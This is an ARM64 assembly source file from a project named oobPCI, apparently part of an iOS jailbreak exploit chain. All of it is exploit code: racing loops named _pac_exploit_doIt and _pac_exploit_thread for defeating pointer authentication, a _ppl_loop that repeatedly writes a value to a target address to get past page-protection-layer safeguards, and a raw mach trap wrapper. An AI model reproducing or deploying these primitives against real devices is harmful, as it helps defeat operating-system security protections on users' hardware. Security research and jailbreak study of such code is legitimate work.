//
//  asm.S
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#define DEF_MACHTRAP(name, num) .global _##name %% _##name: %% mov x16, -num %% svc #0x80 %% ret

.text

.align 4

.global _pac_exploit_thread
_pac_exploit_thread:
    mov x0, x20
    bl _my_mach_port_mod_refs
    b _pac_exploit_thread

.global _pac_exploit_doIt
_pac_exploit_doIt:
    ldr x24, [x11, x25]
    dmb sy
    cmp x24, x20
    bne _pac_exploit_doIt
_pac_exploit_doIt_cont:
    str x19, [x11, x26]
    dmb sy
    ldr x24, [x11, x25]
    dmb sy
    cmp x24, x20
    bne _pac_exploit_doIt
    str x18, [x11, x27]
    dmb sy
    b _pac_exploit_doIt_cont

.global _pac_loop
_pac_loop:
    mov x0, #1
    adrp x1, _gUserReturnDidHappen@PAGE
    str x0, [x1, _gUserReturnDidHappen@PAGEOFF]
    b _pac_loop

.global _ppl_loop
_ppl_loop:
    // x0 -> Value to write
    // x1 -> Address to write to
    // x2 -> Address of done variable
    // x3 -> Address of ready variable
    mov x4, 1
    str x4, [x3]
_ppl_loop_inner:
    str x0, [x1]
    ldr x3, [x2]
    cmp x3, xzr
    beq _ppl_loop_inner
_ppl_yield_loop:
    // We are done, constantly yield until we're stopped
    mov x0, 0
    mov x1, 0
    mov x2, 0
    bl _thread_switch
    b _ppl_yield_loop

.global _ppl_done
_ppl_done:
    b _ppl_done

DEF_MACHTRAP(my_mach_port_mod_refs, 19)

.data
retvalStorage:
    .quad 0

